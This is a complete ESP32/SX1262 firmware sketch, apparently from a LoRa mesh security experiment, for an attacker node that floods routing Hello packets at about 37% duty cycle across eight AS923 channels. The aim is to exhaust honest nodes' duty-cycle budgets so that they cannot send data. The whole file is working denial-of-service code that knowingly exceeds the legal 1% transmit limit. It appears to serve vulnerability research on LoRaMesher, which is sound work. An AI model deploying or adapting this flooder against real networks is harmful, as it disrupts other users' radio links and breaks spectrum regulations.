// E10 — Node C: DUTY CYCLE FLOODER
//
// Sends Hello packets at maximum rate, ignoring AS923 duty cycle limits.
// (In production LoRa deployments, the network server enforces DC.
//  Individual nodes depend on firmware compliance.)
//
// Goal: force honest nodes to process Hellos, update routes, re-broadcast —
// consuming their own DC budget. Data packets cannot be sent if DC is exhausted.
//
// Flood strategy:
//   - SF9 BW125: ~185ms airtime per Hello
//   - Send every FLOOD_INTERVAL_MS (500ms default = 37% DC — well above 1% limit)
//   - Optionally cycle through 8 AS923 channels to distribute load
//
// Measurement: honest nodes log tx_time_ms / elapsed_ms × 100 = DC percentage
//
// Expected output from honest nodes (node_a, node_r1):
//   [DC] tx_ms=185 window_ms=1000 dc=18.5% (limit=1%)
//   [DC] WARN: duty cycle exceeded — data TX suppressed
//   [TX] DATA BLOCKED — DC limit reached
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID          0xCC
#define GATEWAY_ID       0xBB
#define FLOOD_INTERVAL_MS  500   // 500ms → ~37% DC at SF9/BW125 (attacker ignores limit)

// AS923 channel rotation (8 channels, 200 kHz spacing from 923.2 MHz)
static const float AS923_CHANNELS[] = {
  923.2f, 923.4f, 923.6f, 923.8f,
  924.0f, 924.2f, 924.4f, 924.6f
};
#define NUM_CHANNELS  8

#include "../e10_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint16_t flood_seq    = 0;
uint32_t total_floods = 0;
uint32_t total_tx_ms  = 0;
uint8_t  ch_idx       = 0;
uint32_t last_flood   = 0;
uint32_t last_oled    = 0;
uint32_t start_ms     = 0;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  DC FLOOD");
  char buf[32];
  snprintf(buf, sizeof(buf), "floods=%lu", total_floods);
  oled.drawString(0, 14, buf);
  uint32_t elapsed = millis() - start_ms;
  float dc = elapsed > 0 ? (float)total_tx_ms / elapsed * 100 : 0;
  snprintf(buf, sizeof(buf), "DC=%.1f%% (limit=1%%)", dc);
  oled.drawString(0, 28, buf);
  snprintf(buf, sizeof(buf), "ch=%.1fMHz", AS923_CHANNELS[ch_idx]);
  oled.drawString(0, 42, buf);
  oled.display();
}

void send_flood_hello() {
  // Rotate channel to spread load across sub-bands
  float freq = AS923_CHANNELS[ch_idx];
  ch_idx = (ch_idx + 1) % NUM_CHANNELS;
  radio->setFrequency(freq);

  HelloMsg h = {};
  h.type   = MSG_HELLO;
  h.src    = NODE_ID;
  h.dst_gw = GATEWAY_ID;
  h.metric = 1;
  h.seq    = flood_seq++;
  sign_hello(&h);

  uint32_t tx_start = millis();
  radio->transmit((uint8_t*)&h, sizeof(h));
  uint32_t tx_ms = millis() - tx_start;
  radio->startReceive();

  total_floods++;
  total_tx_ms += tx_ms;

  uint32_t elapsed = millis() - start_ms;
  float dc = elapsed > 0 ? (float)total_tx_ms / elapsed * 100 : 0;

  Serial.printf("[FLOOD] Hello seq=%u ch=%.1fMHz tx=%lums DC=%.1f%% floods=%lu\n",
                h.seq, freq, tx_ms, dc, total_floods);
  if (total_floods % 10 == 0) {
    Serial.printf("[FLOOD] Honest nodes forced to re-broadcast → consuming their 1%% DC budget\n");
    Serial.printf("[FLOOD] Expected: honest nodes cannot send data after ~%u floods\n",
                  (uint32_t)(10000 / FLOOD_INTERVAL_MS));  // ~10s worth
  }
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E10 Node C (DUTY CYCLE FLOODER) ===");
  Serial.printf("[INFO] Flood interval: %dms (%d%% DC at SF9/BW125)\n",
                FLOOD_INTERVAL_MS,
                (int)((float)HELLO_AIRTIME_MS / FLOOD_INTERVAL_MS * 100));
  Serial.printf("[INFO] AS923 limit: %d%% → sustained rate ~1 pkt/18.5s\n", DC_LIMIT_PERCENT);
  Serial.println("[INFO] This attacker ignores the limit to exhaust honest nodes' DC budget.");
  Serial.println("[INFO] Finding: LoRaMesher has no DC rate-limiter — resource exhaustion possible.");

  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st);
    while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");

  start_ms = millis();
  oled_draw();
  send_flood_hello();
  last_flood = millis();
}

void loop() {
  uint32_t now = millis();
  if (now - last_flood >= FLOOD_INTERVAL_MS) { last_flood = now; send_flood_hello(); }
  if (now - last_oled  >= 3000)             { last_oled  = now; oled_draw(); }

  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[64];
    radio->readData(buf, sizeof(buf));
    radio->startReceive();
  }
}
